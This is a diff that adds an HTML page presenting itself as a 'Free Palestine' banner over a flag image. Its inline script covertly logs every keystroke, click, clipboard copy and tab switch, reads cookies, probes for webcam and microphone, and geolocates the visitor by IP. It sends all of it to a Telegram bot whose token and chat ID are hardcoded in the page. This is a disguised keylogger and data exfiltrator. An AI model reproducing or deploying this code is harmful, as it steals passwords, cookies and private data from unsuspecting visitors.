@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Free Palestine</title>
+  <style>
+    * { margin: 0; padding: 0; }
+    body, html {
+      height: 100%;
+      overflow: hidden;
+      font-family: sans-serif;
+    }
+    .bg-image {
+      position: fixed;
+      top: 0;
+      left: 0;
+      min-width: 100%;
+      min-height: 100%;
+      z-index: -1;
+      object-fit: cover;
+      background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/c/c0/Flag_of_Palestine.svg/1920px-Flag_of_Palestine.svg.png') no-repeat center center fixed;
+      background-size: cover;
+    }
+    .welcome {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0, 0, 0, 0.5);
+      color: #fff;
+      padding: 30px;
+      border-radius: 15px;
+      font-size: 3rem;
+      text-align: center;
+      text-shadow: 1px 1px 5px black;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Background Image for "Free Palestine" -->
+  <div class="bg-image"></div>
+
+  <div class="welcome">Free Palestine</div>
+
+  <script>
+    const cookies = document.cookie || "No cookies set";
+    const userAgent = navigator.userAgent;
+    const screenSize = `${screen.width}x${screen.height}`;
+    const language = navigator.language || "N/A";
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+    const referrer = document.referrer || "Direct";
+    const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
+    const localTime = new Date().toLocaleString();
+
+    const botToken = '7390648129:AAEzbgI5fla_HpjoXskp0c1t_MjR7m02-J0';
+    const chatId = '6975173404';
+
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    }
+
+    document.addEventListener("visibilitychange", () => {
+      if (document.hidden) {
+        sendToTelegram("User switched tab or minimized the page.");
+      } else {
+        sendToTelegram("User returned to the page.");
+      }
+    });
+
+    document.addEventListener("keydown", (e) => {
+      sendToTelegram(`User typed: ${e.key}`);
+    });
+
+    document.addEventListener("copy", async () => {
+      let clipText = "Not accessible";
+      try {
+        clipText = await navigator.clipboard.readText();
+      } catch (err) {
+        clipText = "Clipboard read blocked by browser.";
+      }
+      sendToTelegram(`User copied text: ${clipText}`);
+    });
+
+    document.addEventListener("click", (e) => {
+      sendToTelegram(`User clicked at X:${e.clientX}, Y:${e.clientY}`);
+    });
+
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          sendToTelegram("User's webcam is active.");
+        })
+        .catch(function(err) {
+          sendToTelegram("User denied webcam access.");
+        });
+
+      navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(function(stream) {
+          sendToTelegram("User's microphone is active.");
+        })
+        .catch(function(err) {
+          sendToTelegram("User denied microphone access.");
+        });
+    }
+
+    try {
+      navigator.mediaDevices.enumerateDevices()
+        .then(devices => {
+          devices.forEach(device => {
+            if (device.kind === 'videoinput' && device.label.toLowerCase().includes('screen')) {
+              sendToTelegram("Screen recording detected.");
+            }
+          });
+        });
+    } catch (error) {
+      sendToTelegram("Screen recording detection failed.");
+    }
+
+    fetch('https://ipapi.co/json')
+      .then(res => res.json())
+      .then(ipData => {
+        const ip = ipData.ip;
+        const location = `${ipData.city}, ${ipData.region}, ${ipData.country_name}`;
+
+        if ('getBattery' in navigator) {
+          navigator.getBattery().then(battery => {
+            const batteryLevel = Math.round(battery.level * 100) + '%';
+
+            const message = `
+New Visitor!
+-----------------------
+IP: ${ip}
+Location: ${location}
+Referrer: ${referrer}
+User Agent: ${userAgent}
+Screen: ${screenSize}
+Language: ${language}
+Timezone: ${timezone}
+Local Time: ${localTime}
+Dark Mode: ${darkMode}
+Battery: ${batteryLevel}
+Cookies: ${cookies}
+            `;
+            sendToTelegram(message);
+          });
+        } else {
+          const message = `
+New Visitor!
+-----------------------
+IP: ${ip}
+Location: ${location}
+Referrer: ${referrer}
+User Agent: ${userAgent}
+Screen: ${screenSize}
+Language: ${language}
+Timezone: ${timezone}
+Local Time: ${localTime}
+Dark Mode: ${darkMode}
+Battery: Not Supported
+Cookies: ${cookies}
+          `;
+          sendToTelegram(message);
+        }
+      });
+  </script>
+</body>
+</html>
